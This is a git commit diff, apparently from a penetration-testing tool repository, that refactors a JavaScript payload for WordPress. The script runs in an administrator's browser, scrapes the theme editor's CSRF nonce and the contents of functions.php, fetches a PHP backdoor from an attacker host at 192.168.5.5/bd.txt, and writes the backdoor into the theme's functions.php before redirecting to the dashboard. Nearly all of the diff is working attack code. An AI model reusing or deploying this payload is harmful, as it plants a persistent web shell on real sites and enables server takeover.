16bd8475a3a596f153bea45d7393be563438b624
Lighthouse IT Security <84382227+lighthouseitsecurity@users.noreply.github.com>
2025-04-26 18:08:40 +0200

    updated

--- CMS/WordPress/PatchFile/patchFileWP.js
+++ CMS/WordPress/PatchFile/patchFileWP.js
@@ -1,11 +1,11 @@
-const phpBdURL = "http://192.168.5.15/bd.txt";
-const themeName = "twentytwentyfour";
-const wpRoot = "";
-const themeEditorPath = wpRoot + "/wp-admin/theme-editor.php";
-const themeEditorQuery = "file=functions.php&theme=" + themeName;
-const dashboardURL = wpRoot + "/wp-admin/index.php";
+const phpBdURL = 'http://192.168.5.5/bd.txt';  // !!! CHANGE THIS !!!
+const themeName = 'twentytwentyfive';          // !!! CHANGE THIS !!!
+const wpRoot = '';                             // !!! CHANGE THIS !!!
+const wpThemeEditorPath = wpRoot + '/wp-admin/theme-editor.php';
+const wpThemeEditorQuery = 'file=functions.php&theme=' + themeName;
+const wpDashboardURL = wpRoot + '/wp-admin/index.php';
 const req = new XMLHttpRequest();
-req.open("GET", themeEditorPath + "?" + themeEditorQuery, false);
+req.open('GET', wpThemeEditorPath + '?' + wpThemeEditorQuery, false);
 req.send(null);
 const csrfToken = req.responseText.match(/input type="hidden" id="nonce" name="nonce" value="([^"]*?)"/)[1];
 const content = req.responseText.match(/editor-keyboard-trap-help-3 editor-keyboard-trap-help-4">([^<]*?)<\/textarea>/)[1];
@@ -14,21 +14,20 @@ async function fetchPHPBd(phpBdURL) {
   const bdContent = await response.text();
   return bdContent;
 }
-var phpBd = "";
 fetchPHPBd(phpBdURL).then(bdContent => {
-  phpBd = bdContent;
+  let phpBd = bdContent;
   function decodeEntity(inStr) {
-    const textarea = document.createElement("textarea");
+    const textarea = document.createElement('textarea');
     textarea.innerHTML = inStr;
     return textarea.value;
   }
-  const bodyData = "nonce=" + csrfToken + "&newcontent=" + phpBd + encodeURIComponent(decodeEntity(content)) + "&action=edit-theme-plugin-file&file=functions.php&theme=" + themeName;
-  req.open("POST", themeEditorPath, true);
-  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  const bodyData = 'nonce=' + csrfToken + '&newcontent=' + phpBd + encodeURIComponent(decodeEntity(content)) + '&action=edit-theme-plugin-file&file=functions.php&theme=' + themeName;
+  req.open('POST', wpThemeEditorPath, true);
+  req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
   req.send(bodyData);
   req.onreadystatechange = function() {
     if (req.readyState == XMLHttpRequest.DONE) {
-      window.location.replace(dashboardURL);
+      window.location.replace(wpDashboardURL);
     }
   }
 });
